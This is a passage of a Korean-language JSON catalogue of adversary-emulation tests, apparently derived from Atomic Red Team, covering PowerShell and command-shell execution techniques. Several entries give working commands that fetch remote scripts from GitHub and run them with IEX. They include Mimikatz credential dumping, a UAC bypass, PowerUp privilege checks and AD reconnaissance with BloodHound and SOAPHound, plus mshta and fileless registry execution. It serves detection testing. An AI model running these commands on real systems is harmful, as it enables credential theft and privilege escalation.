      "procedure": [
        "1) 사전 준비:",
        "   · get_prereq_command에 따라 C:\\Temp\\ExternalPayloads\\PCHunter_free.zip 을 다운로드하고,",
        "     해당 zip을 C:\\Temp\\ExternalPayloads 아래로 압축 해제한다.",
        "",
        "2) PowerShell을 관리자 권한으로 실행한다.",
        "3) 다음 명령을 실행해 PC Hunter를 실행한다.",
        "   · Start-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\#{pchunter64_exe}\"",
        "4) GUI에서 커널 모듈, 드라이버, 프로세스, 핸들, 서비스, 레지스트리, 네트워크 등의 상세 정보를 확인할 수 있다.",
        "5) 공격자는 이를 활용해 보안 제품 비활성화, 루트킷 탐지 회피, 추가 공격 벡터 발굴 등을 수행할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Start-Process -FilePath \"C:\\Temp\\ExternalPayloads\\PCHunter_free\\#{pchunter64_exe}\"",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "PCHunter_free.zip이 다운로드 및 압축 해제되어 있어야 함.",
        "GUI 실행을 위한 인터랙티브 세션 필요.",
        "일부 보안 제품에서 PCHunter 실행을 차단할 수 있음."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\Temp\\ExternalPayloads\\PCHunter_free\\",
            "description": "PC Hunter 실행 파일 및 관련 리소스가 위치하는 디렉토리."
          }
        ],
        "processes": [
          {
            "name": "PCHunter64.exe",
            "description": "커널/프로세스/드라이버 등 저수준 정보를 열람할 수 있는 강력한 진단 도구."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "PC Hunter GUI 종료.",
        "원하면 C:\\Temp\\ExternalPayloads\\PCHunter_free 디렉토리를 삭제하여 흔적 정리."
      ],
      "metadata": {
        "atomic_source_id": "b4ca838d-d013-4461-bf2c-f7132617b409"
      }
    },

    {
      "test_id": "4fd35378-39aa-481e-b7c4-e3bf49375c67",
      "name": "Launch Taskmgr from cmd to View Running Processes",
      "platforms": ["windows"],
      "summary": "cmd에서 taskmgr.exe /7 스위치를 사용해 작업 관리자(Task Manager)를 실행하여 프로세스 목록을 GUI로 확인한다.",
      "procedure": [
        "1) 명령 프롬프트(cmd.exe)를 연다.",
        "2) 다음 명령을 실행한다.",
        "   · taskmgr.exe /7",
        "3) 작업 관리자(Task Manager)가 열리며, 현재 실행 중인 프로세스, CPU/메모리 사용량 등을 확인할 수 있다.",
        "4) 공격자는 이를 이용해 감지 우회 대상, 종료할 보안 프로세스 등을 식별할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "taskmgr.exe /7",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "taskmgr.exe(작업 관리자)가 시스템에 존재해야 함(기본 포함).",
        "GUI 세션이 열려 있어야 한다(서버 Core 환경 등에서는 동작 방식이 다를 수 있음)."
      ],
      "artifacts": {
        "files_created": [],
        "processes": [
          {
            "name": "taskmgr.exe",
            "description": "Windows 작업 관리자. 프로세스, 성능, 시작 프로그램 등 확인 가능."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "작업 관리자 창을 닫으면 테스트 종료.",
        "추가적인 파일/레지스트리 변경 없음."
      ],
      "metadata": {
        "atomic_source_id": "4fd35378-39aa-481e-b7c4-e3bf49375c67"
      }
    }
  ]
},
{
  "technique_id": "T1059",
  "technique_name": "Command and Scripting Interpreter",
  "tactic": "Execution",
  "description": "공격자는 PowerShell이나 cmd 같은 기본 터미널 대신 AutoIt과 같은 스크립트 인터프리터를 이용해 악성 스크립트를 실행할 수 있다. 이 테스트는 AutoIt으로 작성된 스크립트를 실행하여 계산기(calc.exe)를 구동하는 시나리오를 모사한다.",

  "tests": [
    {
      "test_id": "a9b93f17-31cb-435d-a462-5e838a2a6026",
      "name": "AutoIt Script Execution",
      "platforms": ["windows"],
      "summary": "AutoIt 인터프리터를 사용해 calc.au3 스크립트를 실행하고, 성공 시 계산기(calc.exe)가 실행되는지 확인한다.",
      "procedure": [
        "1) 사전 조건으로 AutoIt 실행 파일이 시스템에 설치되어 있어야 한다.",
        "   · 기본 경로: C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe",
        "   · 없을 경우, Atomic 정의의 get_prereq 단계에서 설치 파일을 다운로드 및 /S 옵션으로 무인 설치한다.",
        "",
        "2) PowerShell을 실행한 뒤, 다음과 같이 AutoIt 인터프리터로 스크립트를 실행한다.",
        "   · Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"",
        "   (기본 script_path: PathToAtomicsFolder\\T1059\\src\\calc.au3)",
        "",
        "3) 스크립트 실행에 성공하면 calc.exe(계산기)가 팝업된다.",
        "4) 테스트 종료 후에는 계산기 프로세스를 수동으로 종료한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Start-Process -FilePath \"#{autoit_path}\" -ArgumentList \"#{script_path}\"",
          "cleanup_command": ""
        }
      ],
      "prerequisites": [
        "AutoIt 실행 파일이 지정된 경로에 존재해야 함 (기본값: C:\\Program Files (x86)\\AutoIt3\\AutoIt3.exe).",
        "AutoIt이 설치되어 있지 않은 경우, Atomic 정의에 따라:",
        "  · PathToAtomicsFolder\\..\\ExternalPayloads\\autoit-v3-setup.exe 를 다운로드",
        "  · /S 옵션으로 무인 설치 수행 후 autoit_path 위치에 바이너리 존재 여부 확인",
        "PowerShell에서 Start-Process 실행이 가능해야 함."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "PathToAtomicsFolder\\..\\ExternalPayloads\\autoit-v3-setup.exe",
            "description": "AutoIt 설치 프로그램 (get_prereq 단계에서 다운로드될 수 있음)."
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "AutoIt 실행을 트리거하는 PowerShell 세션."
          },
          {
            "name": "AutoIt3.exe",
            "description": "AutoIt 스크립트를 해석·실행하는 인터프리터 프로세스."
          },
          {
            "name": "calc.exe",
            "description": "테스트 성공 시 실행되는 계산기 프로세스."
          }
        ],
        "registry_keys": [],
        "network": []
      },
      "cleanup": [
        "실행된 calc.exe 프로세스를 종료한다.",
        "AutoIt 설치 자체는 테스트 환경 정책에 따라 유지 또는 제거를 결정한다.",
        "ExternalPayloads 디렉터리에 생성된 autoit-v3-setup.exe는 필요 시 삭제 가능."
      ],
      "metadata": {
        "atomic_source_id": "a9b93f17-31cb-435d-a462-5e838a2a6026"
      }
    }
  ]
},
{
  "technique_id": "T1059.001",
  "technique_name": "Command and Scripting Interpreter: PowerShell",
  "tactic": "Execution",
  "description": "공격자는 PowerShell을 이용해 스크립트를 로드·실행하고, 자격증명 탈취, 도메인 정찰, UAC 우회, 파일리스 실행, 인코딩된 명령 실행 등 다양한 악성 행위를 수행할 수 있다. 아래 테스트들은 그러한 전형적인 악성 PowerShell 사용 패턴을 모사한다.",

  "tests": [
    {
      "test_id": "f3132740-55bc-48c4-bcc0-758a459cd027",
      "name": "Mimikatz (Invoke-Mimikatz -DumpCreds)",
      "platforms": ["windows"],
      "summary": "GitHub에서 Invoke-Mimikatz 스크립트를 다운로드해 메모리 상에서 로드한 후, Invoke-Mimikatz -DumpCreds 로 자격 증명을 덤프한다.",
      "procedure": [
        "1) PowerShellMafia의 Invoke-Mimikatz.ps1을 지정된 URL에서 다운로드한다.",
        "2) IEX (DownloadString(...)) 방식으로 스크립트를 메모리에 로드한다.",
        "3) Invoke-Mimikatz -DumpCreds 를 호출하여 자격 증명 및 해시를 덤프한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds\"",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "a21bb23e-e677-4ee7-af90-6931b57b6350",
      "name": "Run BloodHound from local disk (SharpHound.ps1)",
      "platforms": ["windows"],
      "summary": "로컬 디스크의 SharpHound.ps1 모듈을 Import 후 Invoke-BloodHound를 실행하여 AD 정찰 데이터를 수집·압축한다.",
      "procedure": [
        "1) PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1 존재 여부를 확인한다.",
        "2) 없으면 GitHub에서 SharpHound.ps1을 다운로드해 해당 경로에 저장한다.",
        "3) PowerShell에서 Import-Module 로 SharpHound.ps1을 로드한다.",
        "4) Invoke-BloodHound -OutputDirectory $env:Temp 를 실행하여 도메인 정보를 수집하고 ZIP 파일(*BloodHound.zip)을 생성한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1\"\ntry { Invoke-BloodHound -OutputDirectory $env:Temp }\ncatch { $_; exit $_.Exception.HResult}\nStart-Sleep 5",
          "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force"
        }
      ]
    },

    {
      "test_id": "bf8c1441-4674-4dab-8e4e-39d93d08f9b7",
      "name": "Run BloodHound from Memory using Download Cradle",
      "platforms": ["windows"],
      "summary": "SharpHound.ps1을 원격에서 다운로드 후 메모리에서 바로 로드하여 Invoke-BloodHound를 실행하는 파일리스 실행 패턴.",
      "procedure": [
        "1) IEX (DownloadString(...)) 방식으로 GitHub의 SharpHound.ps1을 메모리에 로드한다.",
        "2) Invoke-BloodHound -OutputDirectory $env:Temp 를 실행한다.",
        "3) 완료 후 Temp 디렉터리에 BloodHound ZIP 파일이 생성된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan\nIEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1');\nInvoke-BloodHound -OutputDirectory $env:Temp\nStart-Sleep 5",
          "cleanup_command": "Remove-Item $env:Temp\\*BloodHound.zip -Force"
        }
      ]
    },

    {
      "test_id": "af1800cf-9f9d-4fd1-a709-14b1e6de020d",
      "name": "Mimikatz - Cradlecraft PsSendKeys",
      "platforms": ["windows"],
      "summary": "WScript.Shell과 SendKeys를 활용하여 Notepad를 제어하고, 메모리에 로드한 Invoke-Mimikatz를 실행해 자격 증명을 덤프하는 고난도 PowerShell 키보드 자동화 기법.",
      "procedure": [
        "1) COM 객체 WScript.Shell 및 Windows.Forms.Clipboard를 사용해 Notepad 실행 및 포커스 획득.",
        "2) SendKeys로 URL을 입력해 Invoke-Mimikatz.ps1 내용을 로드 후 클립보드로 가져온다.",
        "3) IEX($res)로 로드된 스크립트를 실행하고 invoke-mimikatz -dumpcr 를 수행한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell; ... ;IEX($res);invoke-mimikatz -dumpcr",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "06a220b6-7e29-4bd8-9d07-5b4d86742372",
      "name": "Invoke-AppPathBypass (UAC Bypass)",
      "platforms": ["windows"],
      "summary": "Invoke-AppPathBypass를 이용해 App Paths 취약점을 악용, UAC를 우회하여 cmd.exe를 고권한으로 실행하는 Windows 10 대상 시나리오.",
      "procedure": [
        "1) enigma0x3의 Invoke-AppPathBypass.ps1 스크립트를 원격에서 다운로드하여 IEX로 로드한다.",
        "2) Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe' 를 호출해 App Paths를 통한 UAC 우회 공격을 수행한다.",
        "3) 성공 시 Windows 백업 및 복원 창 또는 지정 페이로드가 상승된 권한으로 실행될 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "388a7340-dbc1-4c9d-8e59-b75ad8c6d5da",
      "name": "Powershell MsXml COM object Download Cradle",
      "platforms": ["windows"],
      "summary": "MsXml2.ServerXmlHttp COM 객체를 이용해 Proxy 비인식(Non proxy-aware) HTTP 요청으로 PowerShell 스크립트를 다운로드 및 실행하는 크래들.",
      "procedure": [
        "1) New-Object -ComObject MsXml2.ServerXmlHttp 로 COM 객체를 생성한다.",
        "2) Open/Send 로 지정된 URL에서 스크립트 텍스트를 가져온다.",
        "3) IEX $comMsXml.ResponseText 로 응답 내용을 실행한다.",
        "4) 정상 실행 시 \"Download Cradle test success!\" 메시지가 출력된다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "powershell.exe -exec bypass -noprofile \"$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "4396927f-e503-427b-b023-31049b9b09a6",
      "name": "Powershell XML download and execute",
      "platforms": ["windows"],
      "summary": "System.Xml.XmlDocument 로 XML을 로드하고, XML 내 command 노드의 내용을 실행하는 다운로드 크래들.",
      "procedure": [
        "1) New-Object System.Xml.XmlDocument 로 XML Document 객체를 생성한다.",
        "2) 지정된 URL의 XML을 Load 한다.",
        "3) $Xml.command.a.execute 값을 IEX로 실행한다.",
        "4) 성공 시 \"Download Cradle test success!\" 출력."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -exec bypass -noprofile \"$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX\"",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "8a2ad40b-12c7-4b25-8521-2737b0a415af",
      "name": "Powershell invoke mshta.exe download",
      "platforms": ["windows"],
      "summary": "mshta.exe와 scriptlet(SCT)을 이용해 PowerShell 페이로드를 우회적으로 실행하는 다운로드 크래들.",
      "procedure": [
        "1) cmd.exe 를 통해 mshta.exe javascript: 스킴을 호출한다.",
        "2) GetObject('script:URL').Exec() 를 통해 원격 SCT 스크립트를 실행한다.",
        "3) SCT 안에서 추가 PowerShell 명령이 실행되며, 별도 PowerShell 창이 열려 성공 메시지를 출력한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "C:\\Windows\\system32\\cmd.exe /c \"mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()\"",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "cc50fa2a-a4be-42af-a88f-e347ba0bf4d7",
      "name": "Powershell Invoke-DownloadCradle (수동)",
      "platforms": ["windows"],
      "summary": "Invoke-DownloadCradle.ps1 스크립트를 PowerShell ISE에서 수동으로 실행해 네트워크·엔드포인트 아티팩트 생성 패턴을 재현하는 매뉴얼 테스트.",
      "procedure": [
        "1) 관리자 권한으로 PowerShell_ISE를 실행한다.",
        "2) Invoke-DownloadCradle.ps1 를 불러와 스크립트를 실행한다.",
        "3) 다운로드 및 실행 과정에서 생성되는 네트워크/로그 아티팩트를 관찰한다."
      ],
      "commands": [
        {
          "executor": "manual",
          "elevation_required": true,
          "command": "1. Open Powershell_ise as a Privileged Account\n2. Invoke-DownloadCradle.ps1",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "fa050f5e-bc75-4230-af73-b6fd7852cd73",
      "name": "PowerShell Fileless Script Execution via Registry",
      "platforms": ["windows"],
      "summary": "Base64로 인코딩된 PowerShell 코드를 레지스트리에 저장한 후, 레지스트리에서 직접 읽어와 실행하는 파일리스 실행 패턴.",
      "procedure": [
        "1) HKCU:\\Software\\Classes\\AtomicRedTeam 키에 ART 값(인코딩된 PowerShell 코드)을 등록한다.",
        "2) [Convert]::FromBase64String 과 Text.Encoding::ASCII.GetString 으로 값을 디코딩한다.",
        "3) IEX 로 디코딩된 스크립트를 실행한다.",
        "4) 실행 후 C:\\Windows\\Temp\\art-marker.txt 파일이 생성되면 성공."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "reg.exe add \"HKEY_CURRENT_USER\\Software\\Classes\\AtomicRedTeam\" /v ART /t REG_SZ /d \"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\" /f\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\Software\\Classes\\AtomicRedTeam').ART)))",
          "cleanup_command": "Remove-Item -path C:\\Windows\\Temp\\art-marker.txt -Force -ErrorAction Ignore\nRemove-Item HKCU:\\Software\\Classes\\AtomicRedTeam -Force -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "8e5c5532-1181-4c1d-bb79-b3a9f5dbd680",
      "name": "NTFS Alternate Data Stream Access",
      "platforms": ["windows"],
      "summary": "NTFS Alternate Data Stream(ADS)에 PowerShell 코드를 숨기고, 해당 스트림 내용을 읽어 Invoke-Expression으로 실행하는 기법.",
      "procedure": [
        "1) #{ads_file} 파일을 생성하고 'streamCommand' 스트림에 Write-Host 코드 문자열을 쓴다.",
        "2) Get-Content -Stream 'streamCommand' 로 ADS 내용을 읽는다.",
        "3) Invoke-Expression 으로 문자열을 실행하고, \"Stream Data Executed\" 가 출력되는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Add-Content -Path #{ads_file} -Value 'Write-Host \"Stream Data Executed\"' -Stream 'streamCommand'\n$streamcommand = Get-Content -Path #{ads_file} -Stream 'streamcommand'\nInvoke-Expression $streamcommand",
          "cleanup_command": "Remove-Item #{ads_file} -Force -ErrorAction Ignore"
        }
      ]
    },

    {
      "test_id": "7c1acec2-78fa-4305-a3e0-db2a54cddecd",
      "name": "PowerShell Session Creation and Use (PSRemoting)",
      "platforms": ["windows"],
      "summary": "New-PSSession을 이용해 원격 PowerShell 세션을 생성하고, 기본 네트워크 테스트 및 파일 생성/확인을 수행하는 PSRemoting 사용 패턴.",
      "procedure": [
        "1) New-PSSession -ComputerName #{hostname_to_connect} 로 원격 세션을 생성한다(기본값: 로컬 호스트).",
        "2) Test-Connection 으로 네트워크 연결을 확인한다.",
        "3) TEMP 경로에 T1086_* 파일을 생성 후 내용을 기록하고, Get-Content로 확인한 뒤 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "New-PSSession -ComputerName #{hostname_to_connect}\nTest-Connection $env:COMPUTERNAME\nSet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use -Value \"T1086 PowerShell Session Creation and Use\"\nGet-Content -Path $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use\nRemove-Item -Force $env:TEMP\\T1086_PowerShell_Session_Creation_and_Use",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "686a9785-f99b-41d4-90df-66ed515f81d7",
      "name": "ATHPowerShellCommandLineParameter -Command variations",
      "platforms": ["windows"],
      "summary": "AtomicTestHarnesses 모듈의 Out-ATHPowerShellCommandLineParameter를 사용해 -Command 파라미터의 다양한 표기(C, Command 등)를 테스트하며 PowerShell 실행 패턴을 생성.",
      "procedure": [
        "1) AtomicTestHarnesses 모듈이 설치되어 있고 Out-ATHPowerShellCommandLineParameter가 Export되어 있는지 확인한다.",
        "2) 필요한 경우 Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force 를 통해 설치한다.",
        "3) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute 를 호출한다.",
        "4) 다양한 -Command 형태로 실행되는 PowerShell 프로세스를 관찰한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "1c0a870f-dc74-49cf-9afc-eccc45e58790",
      "name": "ATHPowerShellCommandLineParameter -Command with EncodedArguments",
      "platforms": ["windows"],
      "summary": "AtomicTestHarnesses를 이용해 -Command와 -EncodedArguments 조합을 다양하게 바꾸어 PowerShell 호출 패턴을 생성.",
      "procedure": [
        "1) AtomicTestHarnesses 모듈 및 Out-ATHPowerShellCommandLineParameter 준비.",
        "2) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ... -CommandParamVariation ... -UseEncodedArguments -EncodedArgumentsParamVariation ... -Execute 를 수행.",
        "3) 인코딩된 인자를 사용하는 PowerShell 명령행 패턴을 관찰한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "86a43bad-12e3-4e85-b97c-4d5cf25b95c3",
      "name": "ATHPowerShellCommandLineParameter -EncodedCommand variations",
      "platforms": ["windows"],
      "summary": "-EncodedCommand 파라미터의 다양한 축약/변형(E, EncodedCommand 등)을 사용해 PowerShell 호출 패턴을 생성.",
      "procedure": [
        "1) AtomicTestHarnesses 모듈/커맨드가 준비되어 있는지 확인.",
        "2) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ... -EncodedCommandParamVariation ... -Execute 를 실행.",
        "3) 서로 다른 -EncodedCommand 표기를 사용하는 명령행을 관찰한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -Execute -ErrorAction Stop",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "0d181431-ddf3-4826-8055-2dbf63ae848b",
      "name": "ATHPowerShellCommandLineParameter -EncodedCommand with EncodedArguments",
      "platforms": ["windows"],
      "summary": "-EncodedCommand + -EncodedArguments 조합으로 인코딩된 PowerShell 명령과 인자를 동시에 사용하는 고난도 호출 패턴 생성.",
      "procedure": [
        "1) AtomicTestHarnesses 모듈 준비.",
        "2) Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType ... -EncodedCommandParamVariation ... -UseEncodedArguments -EncodedArgumentsParamVariation ... -Execute 를 실행.",
        "3) 인코딩된 명령과 인자를 사용하는 다양한 명령행 시그니처를 생성한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -EncodedCommandParamVariation #{encoded_command_param_variation} -UseEncodedArguments -EncodedArgumentsParamVariation #{encoded_arguments_param_variation} -Execute -ErrorAction Stop",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "a538de64-1c74-46ed-aa60-b995ed302598",
      "name": "PowerShell Command Execution (obfuscated)",
      "platforms": ["windows"],
      "summary": "Base64 인코딩된 PowerShell 명령(-e)을 이용해 `Write-Host \"Hello, from PowerShell!\"` 를 실행하는 간단한 난독화 예시.",
      "procedure": [
        "1) 'Write-Host \"Hello, from PowerShell!\"' 를 Base64로 인코딩한 문자열을 준비한다.",
        "2) powershell.exe -e <base64> 로 실행한다.",
        "3) 콘솔에 \"Hello, from PowerShell!\" 출력 여부를 확인한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "powershell.exe -e  #{obfuscated_code}",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "49eb9404-5e0f-4031-a179-b40f7be385e3",
      "name": "Invoke Known Malicious Cmdlets (가짜 정의)",
      "platforms": ["windows"],
      "summary": "PowerSploit·PowerView 등에서 자주 보이는 악성 PowerShell Cmdlet 이름들을 함수로 정의하고 호출해, 탐지 로직 검증용 아티팩트를 생성.",
      "procedure": [
        "1) 미리 정의된 악성 Cmdlet 이름 목록을 배열로 정의한다.",
        "2) foreach 루프로 각 이름에 대해 단순 Write-Host 를 수행하는 함수 본문을 정의한다.",
        "3) 다시 각 Cmdlet을 호출하여 실행 패턴을 생성한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "1289f78d-22d2-4590-ac76-166737e1811b",
      "name": "PowerUp Invoke-AllChecks (권한 상승 점검)",
      "platforms": ["windows"],
      "summary": "PowerSploit의 PowerUp.ps1을 원격에서 로드해 Invoke-AllChecks로 로컬 권한 상승 가능성을 점검.",
      "procedure": [
        "1) TLS 1.2를 강제 설정한 뒤, GitHub에서 PowerUp.ps1을 다운로드하여 IEX(iwr ...) 로 메모리에 로드한다.",
        "2) Invoke-AllChecks 를 호출해 서비스 설정, 파일 권한, 레지스트리 등을 점검한다.",
        "3) 출력 결과를 통해 가능한 LPE 경로를 검토한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
      "name": "Abuse Nslookup with DNS Records",
      "platforms": ["windows"],
      "summary": "nslookup 결과(TXT 레코드 등)에 임베딩된 페이로드를 PowerShell에서 평가해 실행하는 패턴을 모사 (예제에서는 whoami).",
      "procedure": [
        "1) PowerShell 함수 nslookup 을 재정의하여 실제 nslookup 실행 후 \"whoami\" 문자열을 반환하도록 설정.",
        "2) powershell .(nslookup -q=txt example.com 8.8.8.8)[-1] 를 실행해 반환된 문자열을 스크립트 블록으로 평가.",
        "3) 결과적으로 whoami 명령이 실행되는 것을 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "function nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "6a5b2a50-d037-4879-bf01-43d4d6cbf73f",
      "name": "SOAPHound - Dump BloodHound Data",
      "platforms": ["windows"],
      "summary": "SOAPHound.exe를 이용해 AD 환경에서 BloodHound용 데이터를 수집·덤프하는 PowerShell 실행.",
      "procedure": [
        "1) SOAPHound.exe 경로와 인증 정보(사용자, 비밀번호, 도메인, DC IP)를 지정한다.",
        "2) --bhdump, --cachefilename, --outputdirectory 옵션을 주고 실행한다.",
        "3) 지정된 출력 디렉터리에 BloodHound 데이터 파일이 생성된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}",
          "cleanup_command": ""
        }
      ]
    },

    {
      "test_id": "4099086c-1470-4223-8085-8186e1ed5948",
      "name": "SOAPHound - Build Cache",
      "platforms": ["windows"],
      "summary": "SOAPHound를 이용해 도메인 캐시를 사전에 구축하는 시나리오 (--buildcache).",
      "procedure": [
        "1) SOAPHound.exe 경로와 사용자/도메인/DC 정보를 지정한다.",
        "2) --buildcache --cachefilename 옵션으로 실행해 캐시 파일을 생성한다.",
        "3) c:\\temp\\cache.txt (기본값)에 캐시가 저장되는지 확인한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}",
          "cleanup_command": ""
        }
      ]
    }
  ]
},
{
  "technique_id": "T1059.003",
  "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
  "tactic": "Execution",
  "description": "공격자는 Windows 명령 프롬프트(cmd.exe)를 이용해 배치 스크립트 실행, 파일 드롭, 인코딩/우회된 명령 실행, 2단계 스크립트 드롭 등 다양한 악성 행위를 수행할 수 있다. 아래 테스트들은 그러한 전형적인 Windows Command Shell 악용 패턴을 모사한다.",

  "tests": [
    {
      "test_id": "9e8894c0-50bd-4525-a96c-d4ac78ece388",
      "name": "Create and Execute Batch Script",
      "platforms": ["windows"],
      "summary": "간단한 .bat 스크립트를 디스크에 생성하고, Start-Process로 실행하여 CMD를 통해 명령을 수행하는 패턴.",
      "procedure": [
        "1) 입력 인자 command_to_execute(기본값: dir)를 사용해 배치 스크립트 내용을 구성한다.",
        "2) 지정된 script_path에 .bat 파일을 생성하고 Set-Content로 명령을 기록한다.",
        "3) PowerShell에서 Start-Process \"#{script_path}\" 로 배치 파일을 실행한다.",
        "4) 실행 후 필요시 Remove-Item으로 스크립트를 삭제한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
